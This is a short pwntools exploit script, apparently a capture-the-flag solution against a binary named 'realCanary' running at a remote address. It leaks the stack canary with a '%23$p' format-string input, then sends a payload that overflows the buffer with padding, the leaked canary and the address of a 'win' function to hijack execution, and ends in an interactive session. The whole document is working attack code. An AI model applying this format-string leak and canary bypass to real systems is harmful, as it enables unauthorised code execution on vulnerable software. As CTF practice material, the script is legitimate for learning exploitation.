from pwn import *

local = False
elf = ELF('./realCanary')

if local:
    io = elf.process()
else:
    io = remote("68.183.110.11", 2003)

#pause()
#win = 0x8049301
#ret = 0x080493ac

io.sendlineafter(b"me :", b"%23$p")

canary = int(io.recvline(), 16)

info(f"leaked canary : {hex(canary)}")

pld = b""
pld += b"A"*64
pld += p32(canary)
pld += b"B"*12
pld += p32(elf.sym['win'])


io.sendlineafter(b"me :", pld)
#io.clean()
#io.recvline()

io.interactive()
